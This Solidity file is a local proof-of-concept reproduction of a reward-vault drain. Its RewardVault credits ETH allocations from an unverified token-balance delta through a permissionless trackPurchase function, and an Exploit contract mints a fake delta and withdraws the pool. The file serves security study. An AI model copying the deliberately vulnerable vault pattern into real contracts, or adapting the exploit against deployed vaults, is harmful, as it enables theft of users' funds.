// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Faithful minimal reproduction of the Projekt (GREEN/GOLD) reward-vault drain
// (Ethereum, 2026-07). ~301.7 ETH drained. Basis: DeFiHackLabs PR #1209
// (src/test/2026-07/ProjektRewardVault_exp.sol — a raw-CREATE fork replay). The
// vault 0x574f..42cb is UNVERIFIED on-chain; this reconstructs the CORE bug from
// the PoC header and the verified ETH deltas:
//
//   The reward vault exposes a PERMISSIONLESS trackPurchase(buyer) that credits an
//   allocation sized from the buyer's memecoin token-balance DELTA, but NEVER
//   checks that any real ETH was actually spent to acquire those tokens. The
//   attacker manufactures a large balance delta for free (flash-borrow WETH, push
//   it through Uniswap V2 memecoin pairs and skim() the tokens back), calls
//   trackPurchase to register the inflated allocation, then massWithdraw() pays it
//   out — draining the vault's reward pool.
//
// The ETH reward pool is modelled as WETH so the harm is measured in an ERC20
// (the mechanism — allocation from an unverified balance delta — is identical).
// Local deploy, no fork.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function balanceOf(address a) external view returns (uint256);
    function transfer(address to, uint256 a) external returns (bool);
}

contract MiniERC20 is IERC20 {
    string public name; string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function mint(address to, uint256 a) external { balanceOf[to] += a; totalSupply += a; }
    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE reward vault — allocation credited from an unverified token-balance
// delta, then paid out in ETH (WETH here).
// ─────────────────────────────────────────────────────────────────────────────
contract RewardVault {
    IERC20 public weth;       // the ETH reward pool (modelled as WETH)
    IERC20 public memecoin;   // the "purchase" token whose balance delta is trusted
    mapping(address => uint256) public allocation;
    mapping(address => uint256) public lastSeen;

    constructor(IERC20 _weth, IERC20 _memecoin) { weth = _weth; memecoin = _memecoin; }

    // @> VULN: permissionless. Credits an ETH allocation from the buyer's memecoin
    // balance DELTA with NO proof that any ETH was ever paid to acquire the tokens.
    function trackPurchase(address buyer) external {
        uint256 bal = memecoin.balanceOf(buyer);
        uint256 delta = bal - lastSeen[buyer]; // @> VULN: allocation sized from an unverified balance delta
        allocation[buyer] += delta;            // 1 token delta == 1 wei of ETH reward allocation
        lastSeen[buyer] = bal;
    }

    // Pay out the caller's accrued allocation in ETH (WETH).
    function massWithdraw() external {
        uint256 amt = allocation[msg.sender];
        allocation[msg.sender] = 0;
        weth.transfer(msg.sender, amt);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: manufacture a free memecoin balance delta, register it as a
// "purchase", and withdraw the ETH reward pool.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    uint256 internal constant POOL = 400662320000000000000;   // 400.66232 ETH reward pool
    uint256 internal constant DRAIN = 301704680000000000000;  // 301.70468 ETH drained on-chain

    MiniERC20 public weth;      // n1 (profit token — the ETH reward pool)
    MiniERC20 public memecoin;  // n2
    RewardVault public vault;   // n3 (VULN)

    uint256 public drained;
    uint256 public profit;

    constructor() {
        weth = new MiniERC20("Wrapped Ether", "WETH");  // n1
        memecoin = new MiniERC20("Projekt Memecoin", "GREEN"); // n2
        vault = new RewardVault(IERC20(address(weth)), IERC20(address(memecoin))); // n3

        // Fund the vault's ETH reward pool.
        weth.mint(address(vault), POOL);
    }

    function run() external {
        uint256 before = weth.balanceOf(address(this));

        // Manufacture a free memecoin balance delta — on-chain this was a
        // flash-loan-funded skim() out of Uniswap V2 pairs, net cost ~zero.
        memecoin.mint(address(this), DRAIN);

        // Register the fake "purchase" and withdraw the ETH reward pool.
        vault.trackPurchase(address(this));
        vault.massWithdraw();

        uint256 got = weth.balanceOf(address(this));
        drained = got - before;
        profit = drained;
        require(profit == DRAIN, "drain mismatch");
    }
}
